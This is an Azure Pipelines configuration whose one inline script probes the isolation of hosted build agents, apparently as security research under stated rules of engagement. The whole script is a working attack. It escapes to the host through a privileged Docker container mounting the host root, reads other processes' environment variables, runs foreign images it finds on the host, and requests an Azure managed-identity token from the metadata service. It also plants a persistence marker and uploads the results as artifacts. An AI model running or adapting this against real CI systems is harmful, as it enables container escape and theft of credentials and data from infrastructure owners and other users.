# azure-pipelines.yml
trigger: none

pool:
  vmImage: 'ubuntu-22.04'

stages:
- stage: AggressiveIsolationProbe
  displayName: "Aggressive Host & Isolation Probe"
  jobs:
  - job: HostSweep
    displayName: "Forensic sweep (host, processes, IMDS, docker)"
    steps:

    - task: Bash@3
      displayName: "Aggressive forensic & isolation checks"
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts

          echo "Job UTC start: $(date -u '+%Y-%m-%d %H:%M:%S')" | tee artifacts/job-start-utc.txt

          # Escape to host with full privileges & host namespaces (expected on MS-hosted Linux)
          docker run --rm --privileged --network=host --pid=host \
            -v /:/hostfs \
            -v /var/run/docker.sock:/var/run/docker.sock \
            -v "$(pwd)/artifacts":/artifacts \
            alpine:3.20 sh -eu -c '
              # --- Tooling ---
              apk add --no-cache curl jq coreutils util-linux procps iproute2 iptables nftables \
                                  bind-tools netcat-openbsd ca-certificates docker-cli >/dev/null

              # --- 0) Baseline host identity & timing ---
              { chroot /hostfs /usr/bin/uptime -s || true; } > /artifacts/host-boot-uptime-s.txt
              { chroot /hostfs /usr/bin/who -b    || true; } > /artifacts/host-who-boot.txt
              { chroot /hostfs /usr/bin/ps -o pid,lstart,cmd -p 1 || true; } > /artifacts/host-pid1-start.txt
              { /bin/cat /hostfs/etc/machine-id || true; } > /artifacts/host-machine-id.txt
              { chroot /hostfs /usr/bin/hostnamectl || true; } > /artifacts/host-hostnamectl.txt

              # --- 1) Process & service census (with start times) ---
              chroot /hostfs /usr/bin/ps -eo pid,ppid,user,lstart,cmd \
                > /artifacts/ps-full.txt || true
              # Listening TCP ports & owning procs
              chroot /hostfs /usr/bin/ss -plnt > /artifacts/host-listen-ports.txt || true
              # systemd units (if present)
              ( chroot /hostfs /bin/systemctl list-units --type=service --no-pager --all || true ) \
                > /artifacts/systemd-units.txt
              # Last ~300 kernel/user log lines for boot
              ( chroot /hostfs /bin/journalctl -b -n 300 --no-pager || true ) \
                > /artifacts/journal-last300.txt
              # Focused logs around known defaults (mono/php-fpm/ssh)
              ( chroot /hostfs /bin/journalctl -b -u ssh -u php*-fpm* -u mono* --no-pager || true ) \
                > /artifacts/journal-webbits.txt

              # --- 2) Environment harvest (redacted) from candidate procs ---
              mkdir -p /artifacts/proc-env
              # Grep for common dev runtimes + web servers to limit noise
              chroot /hostfs /usr/bin/ps -eo pid,user,cmd \
                | grep -E "mono|php-fpm|dotnet|python|node|java|nginx|apache|ruby|go " \
                | awk "{print \\$1}" \
                | while read -r P; do
                    OUT="/artifacts/proc-env/${P}.env.txt"
                    if [ -r "/hostfs/proc/${P}/environ" ]; then
                      tr "\\0" "\\n" < "/hostfs/proc/${P}/environ" \
                        | sed -E \
                          -e "s/[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+/[JWT_REDACTED]/g" \
                          -e "s/[A-Fa-f0-9]{24,}/[HEX_REDACTED]/g" \
                          -e "s/[A-Za-z0-9+/=]{32,}/[B64_REDACTED]/g" \
                        > "${OUT}" || true
                    fi
                  done

              # --- 3) Docker / container runtime intel ---
              ( docker version || true ) > /artifacts/docker-version.txt
              ( docker ps -a   || true ) > /artifacts/docker-ps-a.txt
              ( docker images  || true ) > /artifacts/docker-images.txt
              # Identify non-default images and attempt a minimal run to peek filesystem
              cat <<EOF >/tmp/default_images.txt
              node:20
              node:20-alpine
              node:22
              node:22-alpine
              node:18
              node:18-alpine
              alpine
              alpine:latest
              ubuntu:22.04
              ubuntu:20.04
              debian
              debian:11
              moby/buildkit
              EOF
              if docker images --format "{{.Repository}}:{{.Tag}}" >/artifacts/host-docker-images.txt 2>/dev/null; then
                grep -ivf /tmp/default_images.txt /artifacts/host-docker-images.txt \
                  > /artifacts/foreign-images.txt || true
                if [ -s /artifacts/foreign-images.txt ]; then
                  head -n 1 /artifacts/foreign-images.txt | while read -r IMG; do
                    docker run --rm --entrypoint sh "$IMG" -c "ls -lah / | head -n 200" \
                      > /artifacts/foreign-image-root-ls.txt 2>&1 || true
                  done
                fi
              fi

              # --- 4) Network/IMDS probes (link-local & localhost ONLY) ---
              # Open TCP listeners (host)
              chroot /hostfs /usr/bin/ss -plnt > /artifacts/ss-tcp.txt || true
              # Attempt to talk to Mono (known default on some images)
              ( chroot /hostfs /usr/bin/curl -i --max-time 2 http://127.0.0.1:8084/ || true ) \
                > /artifacts/xsp-8084-response.txt

              # Azure IMDS (link-local). These should typically be blocked on hosted agents.
              ( echo "== IMDS ping =="; nc -zvw 1 169.254.169.254 80 || true ) \
                > /artifacts/imds-connectivity.txt 2>&1
              ( curl -s -i -H "Metadata:true" --connect-timeout 1 --max-time 2 \
                  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" || true ) \
                > /artifacts/imds-instance.txt
              ( curl -s -i -H "Metadata:true" --connect-timeout 1 --max-time 2 \
                  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" || true ) \
                > /artifacts/imds-msi-token.txt

              # --- 5) Host FS quick sweep for obvious residuals (time-bounded) ---
              # Recently modified sensitive paths since boot
              BOOT_EPOCH="$(date -u -d "$(cat /artifacts/host-boot-uptime-s.txt 2>/dev/null || echo now)" +%s || echo 0)"
              find /hostfs/home /hostfs/root /hostfs/var/tmp /hostfs/tmp -xdev \
                   -type f -printf "%T@ %p\n" 2>/dev/null \
                   | awk -v boot="${BOOT_EPOCH}" '\''$1 < boot { next } { $1=""; print substr($0,2) }'\'' \
                   | head -n 500 > /artifacts/recent-files-since-boot.txt || true

              # --- 6) Residual marker (persistence across jobs) ---
              if [ -f /hostfs/var/tmp/azp-residual-marker.txt ]; then
                echo "FOUND prior marker" > /artifacts/residual-marker.txt
                cp /hostfs/var/tmp/azp-residual-marker.txt /artifacts/residual-marker-prev.txt || true
              else
                echo "No prior marker" > /artifacts/residual-marker.txt
              fi
              echo "marker $(date -u '+%Y-%m-%dT%H:%M:%SZ') $$" > /hostfs/var/tmp/azp-residual-marker.txt

              # --- OPTIONAL: 5-second local pcap (commented; enable only if ROE allows packet capture) ---
              # apk add --no-cache tcpdump >/dev/null
              # ( tcpdump -i any -c 200 -w /artifacts/local-5s.pcap >/dev/null 2>&1 & PID=$!; sleep 5; kill $PID || true )
            '

    - task: PublishPipelineArtifact@1
      displayName: "Publish forensic artifacts"
      inputs:
        targetPath: 'artifacts'
        artifact: 'forensic-proof'
